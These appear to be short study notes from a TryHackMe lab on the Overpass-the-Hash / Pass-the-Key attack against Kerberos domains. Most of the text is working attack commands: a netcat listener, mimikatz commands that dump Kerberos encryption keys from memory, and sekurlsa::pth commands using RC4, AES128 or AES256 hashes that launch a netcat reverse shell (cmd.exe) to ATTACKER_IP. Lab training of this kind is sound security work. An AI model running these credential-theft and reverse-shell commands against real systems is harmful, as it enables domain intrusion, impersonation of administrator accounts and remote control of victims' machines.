Overpass-the-hash / Pass-the-Key:
This kind of attack is similar to PtH but applied to Kerberos networks.

1-On our Attacking Machine:
    nc -lvp 5556


2- We can obtain the Kerberos encryption keys from memory by using mimikatz with the following commands:

    mimikatz # privilege::debug
    mimikatz # sekurlsa::ekeys


3- If we have the RC4 hash:
    mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:HASH /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"

If we have the AES128 hash:
    mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:HASH /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"

If we have the AES256 hash:
    mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:HASH /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"

**** 

Notice that when using RC4, the key will be equal to the NTLM hash of a user. 
This means that if we could extract the NTLM hash, we can use it to request a TGT as long as RC4 is one of the enabled protocols. 
This particular variant is usually known as Overpass-the-Hash (OPtH).
